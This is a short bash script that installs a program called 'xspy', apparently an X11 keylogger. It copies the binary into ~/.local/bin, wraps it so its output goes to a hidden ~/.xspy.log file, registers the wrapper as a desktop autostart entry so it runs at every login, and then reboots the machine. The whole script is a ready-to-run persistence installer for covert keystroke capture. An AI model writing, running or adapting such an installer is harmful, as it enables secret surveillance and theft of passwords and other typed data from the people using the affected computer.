#!/bin/bash

mkdir -p ~/.local/bin
cp xspy ~/.local/bin

mkdir -p ~/.config/autostart

cat << EOF > ~/.local/bin/xspyd
#!/bin/bash
/home/$USER/.local/bin/xspy > /home/$USER/.xspy.log
EOF

chmod +x ~/.local/bin/xspyd

cat << EOF > ~/.config/autostart/xpsy.desktop
[Desktop Entry]
Version=1.0
Name=Xspy
Exec=/home/$USER/.local/bin/xspyd
Terminal=false
Type=Application
EOF

reboot
